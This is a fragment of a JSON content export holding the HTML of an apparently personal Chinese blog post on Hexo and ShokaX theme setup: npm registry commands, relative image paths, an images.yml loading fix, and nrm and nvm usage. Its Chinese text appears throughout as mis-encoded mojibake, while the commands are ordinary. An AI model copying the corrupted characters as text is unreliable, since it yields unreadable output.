punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># è®¾ç½®é•œåƒä»“åº“</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">npm</span> config get registry</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># æŸ¥çœ‹å½“å‰é•œåƒä»“åº“</span></pre></td></tr></table></figure><h1 id=\"ç›¸å¯¹è·¯å¾„é—®é¢˜\"><a class=\"anchor\" href=\"#ç›¸å¯¹è·¯å¾„é—®é¢˜\">#</a> ç›¸å¯¹è·¯å¾„é—®é¢˜</h1>\n<p>çœ‹å„è·¯ hexo æ•™ç¨‹åœ¨è¯´ç›¸å¯¹è·¯å¾„æ—¶å€™éƒ½ä¸€è„¸è’™<br />\nå­¦ Linux æ—¶å€™ç›¸å¯¹è·¯å¾„æ˜¯./ å¼€å¤´ï¼Œæˆ–è€…ç»å¯¹è·¯å¾„æ ¹ç›®å½• / å¼€å¤´<br />\nä½†æ˜¯æ•™ç¨‹ä¸Šè°ˆåˆ°å‘å¸ƒæ–‡ç« çš„ç›¸å¯¹è·¯å¾„éƒ½æ˜¯ / å¼€å¤´</p>\n<blockquote>\n<p>å…ˆçœ‹çœ‹å®˜ç½‘çš„è§£é‡Š<br />\nç›¸å¯¹åœ°å€<br />\né»˜è®¤æƒ…å†µä¸‹ï¼ŒHexo ç”Ÿæˆçš„è¶…é“¾æ¥éƒ½æ˜¯ç»å¯¹åœ°å€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„ç½‘ç«™åŸŸåä¸º <a href=\"http://example.com\">example.com</a>ï¼Œæ‚¨æœ‰ä¸€ç¯‡æ–‡ç« åä¸º helloï¼Œé‚£ä¹ˆç»å¯¹é“¾æ¥å¯èƒ½åƒè¿™æ ·ï¼š&lt;<a href=\"http://example.com/hello.html%5C\">http://example.com/hello.html\\</a>&gt; ï¼Œå®ƒæ˜¯ç»å¯¹äºåŸŸåçš„ã€‚ç›¸å¯¹é“¾æ¥åƒè¿™æ ·ï¼š/hello.htmlï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºç”¨ä»€ä¹ˆåŸŸåè®¿é—®è¯¥ç«™ç‚¹ï¼Œéƒ½æ²¡æœ‰å…³ç³»ï¼Œè¿™åœ¨è¿›è¡Œåå‘ä»£ç†æ—¶å¯èƒ½ç”¨åˆ°ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå»ºè®®ä½¿ç”¨ç»å¯¹åœ°å€ã€‚</p>\n</blockquote>\n<p>è¿™é‡Œç›¸å¯¹è·¯å¾„å…¶å®æŒ‡çš„ç½‘ç«™çš„æ ¹ç›®å½•<br />\nåœ¨ hexo g ä¹‹åç”Ÿæˆçš„ public ç›®å½•ä¼šåœ¨ hexo d éƒ¨ç½²åˆ°ç½‘ç«™ä¸Š<br />\né‚£ä¹ˆç›¸å¯¹è·¯å¾„æŒ‡çš„å°±æ˜¯ä»¥ public ç›®å½•ä¸ºèµ·å§‹ /<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-4.png\" alt=\"publicæ–‡ä»¶å¤¹\" /><br />\nå¦‚æœè¿˜æ˜¯å®šä½ä¸åˆ°å›¾ç‰‡çš„åœ°å€ï¼Œå°±æŠŠå›¾ç‰‡å’Œæ–‡ç« æ”¾ä¸€èµ· hexo g ä¹‹åçœ‹ /public ä¸‹çš„ä½ç½®<br />\nç„¶åå°±çŸ¥é“å›¾ç‰‡çš„åœ°å€è¯¥æ€ä¹ˆå†™äº†</p>\n<h1 id=\"imagesymlå›¾ç‰‡åŠ è½½ä¸åˆ°é—®é¢˜\"><a class=\"anchor\" href=\"#imagesymlå›¾ç‰‡åŠ è½½ä¸åˆ°é—®é¢˜\">#</a> images.yml å›¾ç‰‡åŠ è½½ä¸åˆ°é—®é¢˜</h1>\n<blockquote>\n<p>å®˜æ–¹é…ç½®æ–‡æ¡£ï¼š<a href=\"https://docs.kaitaku.xyz/guide/theme.html#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E7%AB%99%E8%BD%AE%E6%92%AD%E5%9B%BE\">https://docs.kaitaku.xyz/guide/theme.html# è‡ªå®šä¹‰ç½‘ç«™è½®æ’­å›¾</a></p>\n</blockquote>\n<p>ä½†æ˜¯æœ¬åœ°æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œimages.yml ä¸­ä½¿ç”¨ç›¸å¯¹è·¯å¾„å›¾ç‰‡æ²¡æœ‰åŠ è½½ï¼Œäºæ˜¯æŒ‰ç…§æ–‡æ¡£è¯´æ˜ï¼Œåˆ†åˆ«åœ¨</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>ä¸»é¢˜æ–‡ä»¶å¤¹ä¸‹_images_index.yml</p>\n</li>\n<li class=\"lvl-2\">\n<p>source/_data/images_index.yml</p>\n</li>\n</ul>\n<p>è¿™äº›ä½ç½®éƒ½<strong>æ²¡æœ‰æˆåŠŸ</strong>åŠ è½½ç½‘ç«™èƒŒæ™¯å›¾ç‰‡ã€‚<br />\n<strong><mark>è§£å†³æ–¹æ¡ˆ</mark></strong><br />\nç›´æ¥ä¿®æ”¹ <code>ä¸»é¢˜æ–‡ä»¶å¤¹ä¸‹_images_index.yml</code> ï¼Œå³ <code>/theme/shohaX/images.yml</code> ã€‚æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ SXC çš„ä¸‹è½½æ–¹å¼ï¼Œä¸»é¢˜æ–‡ä»¶å¤¹åœ¨ <code>/node_modules/hexo-theme-shokaX/images.yml</code></p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>source/_data/images.yml</p>\n</li>\n</ul>\n<blockquote>\n<p>å¿ƒé‡Œè¯ï¼šçœŸæ˜¯ç»™æˆ‘ç´¯åè¡€äº†</p>\n</blockquote>\n<h1 id=\"nrmç®¡ç†\"><a class=\"anchor\" href=\"#nrmç®¡ç†\">#</a> nrm ç®¡ç†</h1>\n<p>nrm æ˜¯ä¸€ä¸ª npm æºç®¡ç†å™¨ï¼Œå…è®¸ä½ å¿«é€Ÿåœ°åœ¨ npm æºé—´åˆ‡æ¢</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> nrm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># å®‰è£… nrm æºç®¡ç†å·¥å…·</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nrm <span class=\"token function\">ls</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># æŸ¥çœ‹å¯é€‰çš„æº</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nrm use <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># åˆ‡æ¢æº</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nrm <span class=\"token builtin class-name\">test</span>     </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># æµ‹è¯•é€Ÿåº¦</span></pre></td></tr></table></figure><h1 id=\"nvm-nodeå¤šç‰ˆæœ¬ç®¡ç†\"><a class=\"anchor\" href=\"#nvm-nodeå¤šç‰ˆæœ¬ç®¡ç†\">#</a> nvm node å¤šç‰ˆæœ¬ç®¡ç†</h1>\n<p>å®‰è£…å’Œä½¿ç”¨å‚è€ƒ<a href=\"http://t.csdnimg.cn/B42dl\">è¿™é‡Œ</a></p>\n<blockquote>\n<p>å‚è€ƒé“¾æ¥<br />\n<a href=\"http://t.csdnimg.cn/WNDXm\"> http://t.csdnimg.cn/WNDXm</a></p>\n</blockquote>\n",
            "tags": [
                "å…³äºshokaX",
                "daily",
                "nodejs"
            ]
        }
    ]
}